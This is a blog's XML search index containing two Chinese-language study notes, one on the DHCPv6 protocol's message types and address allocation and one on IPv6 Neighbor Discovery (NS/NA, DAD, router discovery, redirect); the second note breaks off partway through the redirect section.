<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[DHCPv6协议学习]]></title>
      <url>/2018/10/31/DHCPv6%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>DHCPv6(Dynamic Host Configuration Protocol for IPv6)<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面学到IPv6存在无状态地址配置以及有状态地址配置两种形式，前者多依赖于NDP进行配置，是目前IPv6广泛采用的IPv6地址自动配置方式。但是无状态地址配置方案中路由器并不记录所连接的IPv6主机的具体信息，并且配置方式不能使IPv6主机获取DNS，服务器的IPv6地址等配置信息，在可用性上存在一定缺陷。<br>DHCPv6是一种有状态自动配置协议。在配置过程中，DHCPv6服务器会给主机分配完整的IPv6地址，并且提供DNS服务器地址等配置信息。中间通过DHCPv6中继转发DHCPv6报文，将分配的IPv6与客户端绑定，增强了网络的可管理性。</p>
<h2 id="DHCPv6定义"><a href="#DHCPv6定义" class="headerlink" title="DHCPv6定义"></a>DHCPv6定义</h2><h3 id="组播地址"><a href="#组播地址" class="headerlink" title="组播地址"></a>组播地址</h3><p>DHCPv6协议中不用对DHCPv6服务器进行地址配置，而是发送目的地址为组播地址的报文来定位服务器，使用的组播地址有两个：</p>
<ul>
<li>FF02::1:2：所有DHCPv6服务器和中继代理的组播地址，这个地址是链路范围的，用于客户端和相邻服务器及中继代理之间通信。DHCPv6 服务器和中继代理都是该组的成员</li>
<li>FF05::1:3：所有DHCPv6 服务器组播地址，这个地址是站点范围的，用于中继代理和服务器之间的通信，站点内的所有DHCPv6 服 务器都是此组的成员。 </li>
</ul>
<h3 id="UDP端口"><a href="#UDP端口" class="headerlink" title="UDP端口"></a>UDP端口</h3><p>DHCPv6报文所使用的UDP端口如下：</p>
<ul>
<li>UDP 546端口：客户监听的UDP端口。</li>
<li>UDP 547端口：服务器和中继代理监听的UDP端口。</li>
</ul>
<h3 id="DHCP唯一标识符"><a href="#DHCP唯一标识符" class="headerlink" title="DHCP唯一标识符"></a>DHCP唯一标识符</h3><p>DHCP Unique Identifier (DUID)是用来唯一标示每一个DHCPv6用户或服务器。前言已经提及的绑定管理就是依靠于这个定义。它和DHCPv4中的客户和服务器标识符类似。</p>
<p>从DHCPv6报文处理方面来说，DUID是一段不透明的可变长数据。DHCP客户或服务器对于两个DUID的比较只能看他们是否一样。在[RFC3315]定义了DUID的标准格式来确保唯一性。</p>
<p>DUID的开头两个字节与前面的报文一样都是类型字段，后面是基于类型的可变长数据。</p>
<ol>
<li>DUID-LLT：链路层地址加时间</li>
</ol>
<p><img src="http://otc7tld02.bkt.clouddn.com/DUID-LLT.png" alt=""></p>
<p>如上图所示是LLT的格式：</p>
<ul>
<li>硬件类型：指定硬件设备，依据来源于IANA指定的16位硬件类型。</li>
<li>时间：32位无符号整数，以秒为单位的时间戳。</li>
<li>链路层地址：节点上产生这一DUID的网络设备的链路层地址。具体设备在前面指定。</li>
</ul>
<p>标识符包含有产生时间，所以DUID-LLT很可能是唯一的，所以一般由具有固定存储器的通用设备（PC机）使用此类DUID，在节点上产生DUID的硬件可以独立于DHCPv6操作。</p>
<ol>
<li>DUID-EN：基于企业编号的厂商分配的唯一ID</li>
</ol>
<p><img src="http://otc7tld02.bkt.clouddn.com/DUID-LLNA.png" alt=""></p>
<p>如上图所示是EN的格式：</p>
<ul>
<li>企业编号：IANA用以表示的一个特定厂商。</li>
<li>标识符：每个厂商特定的可变长数据。</li>
</ul>
<p>DUID-EN应当由网络设备的制造商来使用，并且应该能标识由那个网络制造商提供的设备。</p>
<ol>
<li>DUID-LL：链路层地址</li>
</ol>
<p><img src="http://otc7tld02.bkt.clouddn.com/DUID-LL.png" alt=""></p>
<ul>
<li>硬件类型：与LLT中字段功能相同</li>
<li>链路层地址：节点上产生这一DUID的网络设备的链路层地址。设备类型由前字段确定。</li>
</ul>
<p>该类型与LLT类似，但不包含时间字段，用于那些有永久链接对的带有链路层地址的网络接口设备，并且此类设备没有存储生产时间的相应设备。</p>
<h3 id="身份关联"><a href="#身份关联" class="headerlink" title="身份关联"></a>身份关联</h3><p>身份关联(Identity Association IA)是一种概念上的结构，用来标识一系列的DHCPv6配置信息。每一个IA又是有一个32比特的标识符来标识，称之为IAID,IAID与每一个客户内的特定IA是一对一的关系。这点在绑定中也有相应的作用。</p>
<p>一个IPv6中一个接口可以有多个IP地址的特性。IA最初目的是在一个客户定义多个身份，每一个关联一个不同的IPv6地址。租用期由IA进行管理，而不是由地址管理，也就是说，跟新分配的配置信息的DHCPv6交换由IA执行。</p>
<p>每个IA都由两个参数T1和T2控制跟新。IA有以下三种类型：</p>
<ol>
<li>非临时地址身份关联(identity association for non-temporary address, IA_NA)，定义正常的为客户接口分配的IPv6地址。</li>
<li>临时地址身份关联(identity association for temporary. address, IA_TA)，定义临时的为客户接口分配的IPv6地址。</li>
<li>前缀代理身份关联(identity association for prefix delegation, IA_PD)，定义IPv6前缀，这些前缀由代理路由器分配到请求路由器。</li>
</ol>
<h3 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h3><p>前言提及，为了方便管理，会对IPv6地址与客户或服务器进行绑定。绑定过程由元组&lt;客户的DUID,IA类型，IAID&gt;来确定。</p>
<h2 id="DHCPv6报文"><a href="#DHCPv6报文" class="headerlink" title="DHCPv6报文"></a>DHCPv6报文</h2><p>前面提及有很多类型报文，DHCP也存在报文，但与不同目标交互报文格式不同。</p>
<h3 id="客户与服务器"><a href="#客户与服务器" class="headerlink" title="客户与服务器"></a>客户与服务器</h3><p><img src="http://otc7tld02.bkt.clouddn.com/DHCPv6%20ctos.png" alt=""></p>
<p>如上图所示是客户与服务器之间使用的DHCPv6报文格式：</p>
<ul>
<li>报文类型：8位整数，标识DHCP报文类型。</li>
<li>事务ID：报文交换的事务ID,一个24位整数。事务ID由交换的发起者（通常为客户）选定。响应端复制ID到响应。当发起者接收到响应时，会与ID匹配来确定对于的交换。</li>
<li>选项：报文所携带的选项，此字段包含DHCPv6服务器分配给IPv6主机的配置信息。</li>
</ul>
<h3 id="中继代理与服务器"><a href="#中继代理与服务器" class="headerlink" title="中继代理与服务器"></a>中继代理与服务器</h3><p><img src="http://otc7tld02.bkt.clouddn.com/DHCPv6%20rtos.png" alt=""></p>
<p>如上图所示是中继代理和服务器之间使用的DHCPv6报文格式：</p>
<ul>
<li>报文类型：表示类型，只能为12(中继转发)或13(中继应答)。</li>
<li>跳数：这个字段只有在中继转发报文中有效，表示报文中继代理个数，避免报文进入无限循环。</li>
<li>链路地址：一个全球地址，服务器用这个地址表示客户所在链路。</li>
<li>对等地址：客户或中继代理的地址，通过此类地址接受将要中继的报文。这个地址在中继转发报文中设置，并在中继应答报文中使用，使得应答报文能转回客户。</li>
<li>选项：该字段包含特定于中继代理操作的DHCPv6选项。必须始终包含中继报文选项。</li>
</ul>
<h3 id="DHCP报文类型"><a href="#DHCP报文类型" class="headerlink" title="DHCP报文类型"></a>DHCP报文类型</h3><table>
<thead>
<tr>
<th style="text-align:center">类 型</th>
<th style="text-align:center">名 称</th>
<th style="text-align:center">描 述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">寻求(solicit)</td>
<td style="text-align:center">客户发出，寻找可用DHCPv6服务器</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">广告(advertise)</td>
<td style="text-align:center">服务器发出，携带配置信息以响应寻求报文</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">请求(request)</td>
<td style="text-align:center">客户发出，到指定服务器进行资源分配</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">确认(confirm)</td>
<td style="text-align:center">当客户转移到不同链路时发出，确认分配地址及前缀是否有效</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">更新(renew)</td>
<td style="text-align:center">客户发出到资源分配服务器以跟新资源</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">重新绑定(rebind)</td>
<td style="text-align:center">跟新报文失败时，客户发出以跟新分配的信息资源</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">应答(reply)</td>
<td style="text-align:center">服务器发出，响应客户各种报文，主要是确认或拒绝客户的请求</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">释放(releasc)</td>
<td style="text-align:center">客户发出，通知分配资源了的服务器可以释放资源。</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">拒绝(decline )</td>
<td style="text-align:center">客户发出，告知服务器某分配地址已经在使用。</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">重配置(reconfigure)</td>
<td style="text-align:center">服务器发出，发起一个以更新或请求报文开始的交换。促使客户刷新分配的信息</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">信息请求(informationrequecst)</td>
<td style="text-align:center">客户发出，用于无状态服务</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">中继转发(relay-forward)</td>
<td style="text-align:center">中继代理发出，封装从客户到服务器的报文</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">中继应答(relay-reply)</td>
<td style="text-align:center">服务器发出，通过中继封装一个返回到客户的报文。</td>
</tr>
</tbody>
</table>
<h2 id="DHCPv6工作原理"><a href="#DHCPv6工作原理" class="headerlink" title="DHCPv6工作原理"></a>DHCPv6工作原理</h2><h3 id="有状态自动分配"><a href="#有状态自动分配" class="headerlink" title="有状态自动分配"></a>有状态自动分配</h3><p>IPv6主机在地址分配之前，由IPv6节点生成链路本地地址并且经过DAD检验之后，首先会有一个链路路由器发现的过程，此时IPv6节点发送RS报文，链路路由器回应以RA报文，之前就已经提及，RA报文中有M，O字段，如果两个字段值都为1，则表示IPv6节点通过有状态DHCPv6进行配置。</p>
<p>DHCPv6服务器进行地址分配以及前缀分配有两种类型：四步交互分配和两步交互分配。</p>
<h4 id="四步交互分配"><a href="#四步交互分配" class="headerlink" title="四步交互分配"></a>四步交互分配</h4><p>当网络中存在有多个DHCPv6服务器时，常使用四步交互分配：</p>
<ol>
<li>客户端发送Solicit报文以寻求DHCPv6服务器。</li>
<li>如果Solicit报文没有Rapid Commit选项，或DHCPv6服务器不支持快速分配过程，则服务器回复Advertise报文，通知客户端其存在关系。</li>
<li>客户端如果收到多个Advertise报文，则根据报文中服务器的优先级等参数选择最优服务器，并向所有服务器发送Request报文，其中包含已选择服务器的DUID.</li>
<li>DHCPv6服务器回复Reply报文，确认将地址和网络配置参数分配给客户端使用。</li>
</ol>
<h4 id="两步交互分配"><a href="#两步交互分配" class="headerlink" title="两步交互分配"></a>两步交互分配</h4><p>当网络中仅存在有一个DHCPv6服务器时，常使用两步交互分配，这种方法可以提高DHCPv6的工作效率，但为了防止多个服务器同时可以分配IPv6地址并回应Reply报文，管理员可配置服务器是否支持两步交互地址分配方式。</p>
<ol>
<li>客户端发送Solicit报文，并带有Rapid Commit选项，标识客户端希望服务器能够快速为其分配地址和网络配置参数。</li>
<li>DHCPv6服务器接收到报文后进行如下处理：<ol>
<li>若支持快速分配地址，则直接返回Reply报文，带有分配给的Ipv6地址以及网络配置参数，当然也带有Rapid Commit选项。</li>
<li>若不支持快速分配，则采用四部交互方式开始进行分配。</li>
</ol>
</li>
</ol>
<h3 id="无状态自动分配"><a href="#无状态自动分配" class="headerlink" title="无状态自动分配"></a>无状态自动分配</h3><p>节点接收的RA报文中M,O字段若标识为0和1的话，标识IPv6只通过DHCPv6获取<br>除IPv6地址以外的服务器配置信息。</p>
<p>其工作过程如下：</p>
<ol>
<li>客户端以组播方式向服务器发送Information-Request报文，该报文中Option Request指定想要获取的配置参数。</li>
<li>服务器接收到报文后，为客户端配置参数，并以单播形式发送Reply报文。</li>
</ol>
<h3 id="中继工作原理"><a href="#中继工作原理" class="headerlink" title="中继工作原理"></a>中继工作原理</h3><p>客户端与服务器之间并非直接通信，在他们之间会有一个中继代理对报文进行处理封装，其交互工作过程如下：</p>
<ol>
<li>客户端向所有服务器以及中继的组播地址FF02::1:2发送请求报文。</li>
<li><p>中继转发报文有如下两种情况：</p>
<p> 1）若中继与客户端处于同一链路上，即DHCPv6中继为DHCPv6客户端的第一跳中继，中继接收到的客户端报文，将其封装到Relay-Forward报文的中继消息选项，发送给服务器。</p>
<p> 2）若中继与客户端处于不同链路上，中继接收的报文是来自其它中继的Relay-Forward报文，中继会狗仔一个新的Relay-Forwrad报文并发送给服务器或下一跳中继。</p>
</li>
<li>服务器从Relay-Forward报文中解析出客户端的请求，为客户端选择IPv6地址和其他配置参数，构造应答信息，并将应答信息封装到Relay-Reply报文的中继消息选项中发送给中继。</li>
<li>中继解析出服务器的应答，转发给客户端，客户端根据应答报文中服务器优先级选择最优选项对地址及其他网络配置参数进行配置。</li>
</ol>
<h3 id="IPv6-前缀选择"><a href="#IPv6-前缀选择" class="headerlink" title="IPv6/前缀选择"></a>IPv6/前缀选择</h3><p>DHCPv6服务器对IPv6地址进行分配是有优先次序的。</p>
<ol>
<li>选择IPv6地址池，服务器的接口必须绑定有IPv6地址池，所以特定端口下的客户端使用该端口绑定的地址池进行IPv6/前缀选择。</li>
<li><p>选择IPv6/前缀.</p>
<p> 1) 如果地址池中为客户端已指定地址/前缀,优先选择与客户端DUID匹配的地址/前缀。</p>
<p> 2）如果客户端报文中的IA选项带有有效地址/前缀，优先进行分配，如果改地址/前缀在地址池中不可用，则另外分配一个空闲地址/前缀给客户端。</p>
<p> 3）从地址池选择空闲地址/前缀分配给客户端。</p>
<p> 4）没有合适地址/前缀进行分配，则分配失败。</p>
</li>
</ol>
<h3 id="地址租约更新"><a href="#地址租约更新" class="headerlink" title="地址租约更新"></a>地址租约更新</h3><p>服务器分配给客户端的地址是有租约的，其约定由生命期（包括地址优先生命期和有效生命期）和IA的两个参数，T1，T2，即续租时间点组成。</p>
<p>当客户端地址使用到期，则在T1时刻发送Renew报文给服务器，其中IA选项携带需要续租的IA地址。</p>
<p>如果客户端一直未收到T1续租报文的回应报文，则在T2时刻发送Rebind报文继续续租。</p>
<h4 id="T1时刻"><a href="#T1时刻" class="headerlink" title="T1时刻"></a>T1时刻</h4><ol>
<li>客户端在T1时刻发送Renew报文进行地址续租更新请求。</li>
<li><p>服务器回应Reply报文两种情况。</p>
<p> a) 若客户端可继续使用，则回应续租Reply报文，表示成功更新租约。</p>
<p> b) 若客户端不可再使用，则报文通知续租失败。</p>
</li>
</ol>
<h4 id="T2时刻"><a href="#T2时刻" class="headerlink" title="T2时刻"></a>T2时刻</h4><ol>
<li>向所有服务器组播发送Rebind报文请求更新租约。</li>
<li><p>服务器回应Reply报文两种情况。</p>
<p> a) 若客户端可继续使用，则回应续租Reply报文，表示成功更新租约。</p>
<p> b) 若客户端不可再使用，则报文通知续租失败。</p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> protocol </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IPv6 DHCPv6 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IPv6 NDP协议学习]]></title>
      <url>/2018/10/19/IPv6-NDP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>邻居发现协议NDP(Neighbour Discover Protocol)<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>众所周知，在IPv4的通信中，地址解析协议ARP(Address Resolution Protocol)起着至关重要的作用，但是也产生了不少的安全问题，利用ARP发起相关的攻击，造成一定的危害。在IPv6中一个新的协议替代了ARP协议，邻居发现协议NDP，它定义了使用ICMPv6报文实现地址解析，邻居不可达检测(NUD)，重复地址检测(DAD)，路由器发现以及重定向等功能。</p>
<p>参考：<a href="https://blog.csdn.net/qq_38265137/article/details/80466128" target="_blank" rel="external">https://blog.csdn.net/qq_38265137/article/details/80466128</a><br><a href="https://blog.csdn.net/frank\_jb/article/details/49949483?utm_source=blogxgwz0" target="_blank" rel="external">https://blog.csdn.net/frank_jb/article/details/49949483?utm_source=blogxgwz0</a></p>
<h2 id="0x00-新名词信息"><a href="#0x00-新名词信息" class="headerlink" title="0x00 新名词信息"></a>0x00 新名词信息</h2><p>在ICMPv6学习中我们了解到了四个错误报文，和两个回应报文，并且也提及了，在NDP协议中定义了五个新的报文如下：</p>
<ul>
<li>RS(Router Solicitation，路由请求):ICMPv6类型：Type=133</li>
<li>RA（Router Advertisment，路由器公告）:ICMPv6类型：Type=134</li>
<li>NS（Neighbor Solicitationh，领居请求）:ICMPv6类型：Type=135</li>
<li>NA（Neighbor Advertisement，邻居公告）:ICMPv6类型：Type=136</li>
<li>Redirect（重定向报文）:ICMPv6类型：Type=137</li>
</ul>
<p>前言中说到了在NDP协议中包含了许多新的知识点，这里总括一下：</p>
<ol>
<li>地址解析：在IPv6中，地址解析是让两个希望通信的节点间相互确定目的节点的链路本地地址的方法。除了解析功能外，还是用那个NUD来维持邻居节点之间的可达性状态信息。</li>
<li>无状态地址配置：有状态地址配置的时候使用DHCPv6进行分配，而无状态地址配置是NDP中特有的地址自动配置机制，包括路由发现，接口ID自动生成，重复地址检测，无状态地址配置等机制，链路上的节点可以自动获取IPv6全球单播地址。</li>
<li>重定向：直白的说就是找到了一条更好的路径去传输报文，则路由就会通知节点进行相关配置的变更。</li>
</ol>
<p>以上涉及的一些新名词就是本篇要着重介绍的知识。</p>
<h2 id="0x01-地址解析"><a href="#0x01-地址解析" class="headerlink" title="0x01 地址解析"></a>0x01 地址解析</h2><p>IPv4中ARP报文直接被封装在以太网报文中，以太网协议的类型是0x0806，普遍认为ARP定位为2.5层的协议。NDP本身基于ICMPv6实现，其所使用的报文都是被封装在ICMPv6报文中，以太网协类型为0x86DD,即IPv6报文，所以一般NDP被看成第三层协议。与链路层协议无关的益处有以下几点：</p>
<pre><code>1. 加强了地址解析协议与二层链路的独立性，在链路层不同的链路层协议都可以使用相同的地址解析协议。
2. 增强了安全性，利用第三层标准的安全认证机制可以防止ARP的相关攻击。
3. 使用了组播方式发送请求报文，减少了二层网路的性能压力。
</code></pre><p>在地址解析过程中所需要的ICMPv6报文为：NS以及NA，如下图所示分别是NS及NA的报文格式：</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/NS1.png" alt=""></p>
<p><img src="http://otc7tld02.bkt.clouddn.com/NA.png" alt=""></p>
<p>NS：Type字段值为135，Code字段值为0，在地址解析中作业可类比IPv4的ARP请求报文。校验和字段包含了ICMPv6校验和值，发送端必须将保留字段设置为0，接受段忽略此字段。</p>
<p>目标地址字段包含了请求目标的地址。这个字段一定不能包含多播地址</p>
<p>源链路层地址选项是目前为邻居请求报文定义的唯一一个选项。在多播发送邻居请求报文时，发送端必须包含其链路层地址。如果源地址是不确定地址，则必须忽略此选项。</p>
<p>NA：Type字段值为136，Code字段值为0，在地址解析中作业可类比IPv4的ARP应答报文。校验和字段包含了ICMPv6校验和值，发送端必须将保留字段设置为0，接受段忽略此字段</p>
<ol>
<li>R：”路由器(Router)标志”，当置1时候，就说明发送者是路由器，R字段由NUD(地址不可达检测)使用，用于检测改变为主机的路由器。</li>
<li>S：”请求(Solicited)标志”，这个标志说明收到邻居广告报文是否是对广告目的地址指定的节点发送的请求报文的响应，但是在带有多播目的地址的邻居广告报文中必须将S标志清楚。</li>
<li>O：”覆盖(Override)标志”:邻居广告报文中设置O字段时，如果缓存了发送端广告报文的链路层地址，接收端就会对这个缓存条目进行跟新。如果缓存的条目不存在，接收端就会创建包含发送端链路层地址的条目。但是不能为任播地址配置O字段。</li>
</ol>
<p>目标地址字段中包含邻居请求报文目标地址的字段的值。<br>目标链路层地址选项是为邻居广告报文定义的唯一一个选项。发送端在多播发送邻居广告报文时必须包含其链路层地址。接收端必须不认识的和其他认识的选项都忽略掉。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/NSNA%E4%BE%8B%E5%AD%90.png" alt=""></p>
<p>使用网上的一个例子帮助理解一下解析的过程：</p>
<ol>
<li>HostA想要得知HostB的链路层地址，于是向B发送了一个NS报文，相关信息为Type=135 源地址为A的IPv6地址，目的地址为B请求节点组播地址，并在NS报文的Options字段中加入了HostA的链路层地址。</li>
<li>HostBs收到了NS报文后，就回应NA报文，相关信息为Type=136，源地址为B的IPv6地址，目的地址为A的IPv6地址（使用NS报文选项字段的A的链路层地址进行单播），并在NA报文的Options字段中加入了HostB的链路层地址。</li>
<li>A与B之间经过上述的包交互，便可以实现相互通信，这样就完成了一个地址解析的过程。</li>
</ol>
<h2 id="0x02-邻居不可达检测"><a href="#0x02-邻居不可达检测" class="headerlink" title="0x02 邻居不可达检测"></a>0x02 邻居不可达检测</h2><p>NUD(Neighbour Unreachable Detection,邻居不可达检测)是一个新的机制。用来保持对邻居可达性状态的检测。<br>邻居缓存表中定义了6种状态：</p>
<ol>
<li>INCOMPLETE(未完成状态):表示对邻居链路层地址的地址解析正在进行中，但邻居链路层地址尚未确定。</li>
<li>REACHABLE(可达状态):表示地址解析成功结束，该邻居可达。</li>
<li>STALE(失效状态):表示可达时间耗尽，未确定邻居是否可达。</li>
<li>DELAY(延迟状态):表示未确定邻居是否可达。此状态的邻居就不再认为是可达的了。</li>
<li>PROBE(探测状态):节点会周期性地向处于PROBE状态的邻居持续发送NS报文。</li>
<li>EMPTY(空闲状态):表示节点上没有相关邻接点的邻居缓存表项。</li>
</ol>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E7%BB%98%E5%9B%BE1.jpg" alt=""></p>
<p>如上图所示，各状态之间可以实现相互转换：</p>
<ol>
<li>在EMPTY状态时，如果有报文发送给邻接节点，那么就在本地邻居缓存表建立该邻接节点的表项，邻居的可达性状态变为INCOMPLETE，同时向邻接节点以组播方式发送NS报文。</li>
<li>节点接收到了邻居回应的单播NA报文后，也就意味着地址解析成功，邻居可达性状态变为REACHABLE，否则变为Empty,即为删除表项。</li>
<li>处于REACHABLE状态的表项，如果在默认(30s)时间内未接收到关于该邻居的”可达性证实信息”，则进入STALE状态。另外，如果该节点收到邻居节点发出的非S置位NA报文，并且链路层地址发生变化，也会进入STALE状态。</li>
<li>在处于STALE状态的邻居产生流量时，节点要开始进行可达性探测。节点会将探测分组的传输延时一段时间，以便给高层协议一个提供邻居可达性信息的机会。这段延迟使得邻居的可达性状态转换为DELAY状态。</li>
<li>在DELAY状态下，如果在默认(5s)时间内未收到关于该邻居的”可达性正式信息”，则该表项进入PROBE状态。</li>
<li>在PROBE状态下，发送方每隔一段时间(1s)发送单播NS,发送固定次数(3)次后，若收到应答NA,则状态变为Reachable，否则变为Empty,即为删除表项。</li>
</ol>
<h2 id="0x03-无状态地址分配"><a href="#0x03-无状态地址分配" class="headerlink" title="0x03 无状态地址分配"></a>0x03 无状态地址分配</h2><p>开头就已经提及，在IPv6下存在有状态和无状态的配置机制，前者依靠DHCPv6，后者通过NDP,在无状态地址自动配置中，主机通过接受链路上的路由器发出的RA消息，结合接口的标识符而生成一个全球单播地址。</p>
<h3 id="重复地址检测-DAD"><a href="#重复地址检测-DAD" class="headerlink" title="重复地址检测(DAD)"></a>重复地址检测(DAD)</h3><p>Duplicate Address Detect是在某个接口使用IPv6单播地址之前进行的。保证地址的唯一性。尤其是在地址自动配置时显得尤为重要。避免地址重复。</p>
<p>一个IPv6单播地址进行DAD是称之为主机的试验地址。接口在执行DAD时还无法使用这个地址进行通信，但是仍然会加入两个组播组：ALL-NODES组播组和试验地址对用的Solicited-Node组播组。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/DAD%E4%BE%8B%E5%AD%90.png" alt=""></p>
<p>如上所示就是DAD的大致过程，A的IPv6地址FC00::1是新配置的地址，所以向FC00::1的组播组发送一个请求，由于FC00::1并未正式指定，所以NS报文的src只能是未指定状态。当B接收到NS报文后会给以回复：</p>
<ol>
<li>B的试验地址也包含FC00::1,则B会放弃使用该地址为接口地址，并且不会发送NA报文。</li>
<li>B发现FC00::1是一个正常使用的地址，则会发送NA报文通知A改地址已被使用，A上该试验地址不生效，被标志位duplicated(被复制)状态<h3 id="路由发现"><a href="#路由发现" class="headerlink" title="路由发现"></a>路由发现</h3></li>
</ol>
<p>路由发现主要通过以下RA以及RS两种报文进行交互，以下是两种报文的格式：</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/RS.png" alt=""></p>
<ol>
<li>RS(路由请求报文)的类型字段值为133，代码字段值为0，校验和字段包含了ICMPv6校验和值。发送端必须将保留字段设置为0，接收端忽略此字段。</li>
<li>有一个唯一的选项是源链路层地址选项，如果发送端知道他的链路层地址，就会在路由器请求报文中包含带有这条信息的源链路层地址选项。如果源地址是不确定地址则忽略此选项。</li>
<li>同时接收端要忽略那些不认识的和其他认识的选项，在这儿不产生任何错误报文，只会对报文继续进行处理。</li>
</ol>
<p><img src="http://otc7tld02.bkt.clouddn.com/RA.png" alt=""></p>
<ol>
<li>RA(路由广告报文)的类型字段值为134，代码字段值为0，校验和字段包含了ICMPv6校验和值。发送端必须将保留字段设置为0，接收端忽略此字段。</li>
<li>当前的跳数限制字段包含的是要放入所有输出分组的IPv6首部的跳数限制字段的默认值。如果值为0则说明路由器没有说明跳数限制的配置。</li>
<li>M字段为”管理的地址配置”标志。M的取值标志着地址配置是否可以使用DHCPv6。</li>
<li>O字段为”其他有状态配置”标志。O的取值标志着是否可以使用DHCPv6的无状态子集来获取不与特定地址相关的配置信息，例如DNS递归名字服务器的IPv6地址。</li>
<li>路由器寿命字段是一个16比特的无符号整数，说明了路由器要当多久的默认路由。这个值是以秒为单位，最大值为18.2小时。值为0说明传输路由器不是默认路由。这种情况下不会把路由器作为向链外目的地发送分组的下一跳候选者。</li>
<li>可达时间字段是一个32比特的无符号整数，说明了下一个节点从与通信的邻居收到可达性证实之后，认为这个邻居在多长时间内是可达的。这个值以毫秒为单位。当可达时间到期，但却没有收到相关可达性证实，节点就开始进行NUD。值为0说明广告路由没有指定这个参数。</li>
<li>重传定时器字段是一个32比特的无符号整数，以毫秒为单位，说明了NUD以及地址解析算法中分组传输的间隔。值为0说明广告路由没有指定这个参数。</li>
<li>一共存在有三个选项：源链路层地址选项，MTU选项以及前缀信息。源链路层地址：路由器可在选项中设置发送接口的链路层地址，这样接受主机在通过路由器发送分组时候就无需执行链路层地址解析了。MTU:通过MTU选项为那些缺乏良好定义的MTU长度的链路提供统一的MTU值。</li>
</ol>
<p><strong>注</strong>：当主机所在的链路中存在多个设备时，需要根据报文的目的地址选择转发设备。在这种情况下设备通过发布默认路由优先级和特定路由信息给主机。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/RA1.png" alt=""></p>
<p>如上图所示，是优化过的RA报文，其中H字段是为了支持IPv6移动性定义的。<br>优先字段为一个2比特的路由器优先字段，说明了默认路由间的优先级情况：</p>
<table>
<thead>
<tr>
<th style="text-align:center">编码</th>
<th style="text-align:center">优先级</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">01</td>
<td style="text-align:center">高</td>
</tr>
<tr>
<td style="text-align:center">00</td>
<td style="text-align:center">中</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">低</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">保留</td>
</tr>
</tbody>
</table>
<p>当主机收到上述的RA报文后，会跟新自己的默认路由表，优先选择链路上优先级最高的设备发送报文，如果设备故障，继续根据优先级选择其他设备。但是如果接受到RA报文中显示路由的寿命为0，那么直接忽略优先级。</p>
<h3 id="地址自动配置"><a href="#地址自动配置" class="headerlink" title="地址自动配置"></a>地址自动配置</h3><p>NDP进行无状态自动配置包含两个阶段：链路本地地址的配置以及全球单播地址的配置。</p>
<p>当一个接口启用时，主机会首先根据本地前缀FE80::/64和EUI-64接口标识符，为该接口生成一个链路本地地址，如果在后续的DAD中发现地址冲突，则必须对接口手动配置本地链路地址，否则接口不能使用。而且，一个链路本地地址的优先时间和有效时间是无限的。</p>
<p>对于主机全球单播地址的配置有如下几步：</p>
<ol>
<li>主机配置有链路本地地址后，发送RS报文请求发现路由。</li>
<li>路由器接收到RS后发送单播RA,RA中包含有无状态地址配置的前缀信息，同时路由器也会周期性地发送组播RA报文。</li>
<li>主机节点收到RA后，根据前缀信息和配置信息生成一个临时的全球淡泊地址。同时使用DAD发送NS以确保地址唯一性。</li>
<li>链路上其他节点接收DAD的NS报文后若无用户使用改地址则丢弃报文，否则应答NS发送NA报文。</li>
<li>节点没有收到回应报文，则说明地址唯一，则使用该临时地址初始化接口，地址有效化。</li>
<li>地址自动配置完成，路由器可自动进行NUD以周期性发送NS方法确定可达性。</li>
</ol>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>当网关设备发现其他更优网关设备来转发报文，它就会发送重定向保卫通知报文的发送者，让报文发送者选择另一个网关设备。重定向报文也是封装ICMPv6报文中的，其报文格式如下图所示：</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E9%87%8D%E5%AE%9A%E5%90%91%E6%8A%A5%E6%96%87.png" alt=""></p>
<ol>
<li>重定向报文的类型字段值为137，代码字段值为0，校验和字段包含了ICMPv6校验和值。发送端必须将保留字段设置为0，接收端忽略此字段。</li>
<li>如果有更好的第一跳路由器，或者目的地是一个在链的邻居，路由器就会发送重定向报文。在第一种情况下，目标地址字段中包含了更好的第一跳路由器的链路本地地址:在第二种情况下，目标地址字段的值与目的地址字段的值相同。</li>
<li>目的地址字段中包含了分组最终目的地的地址。</li>
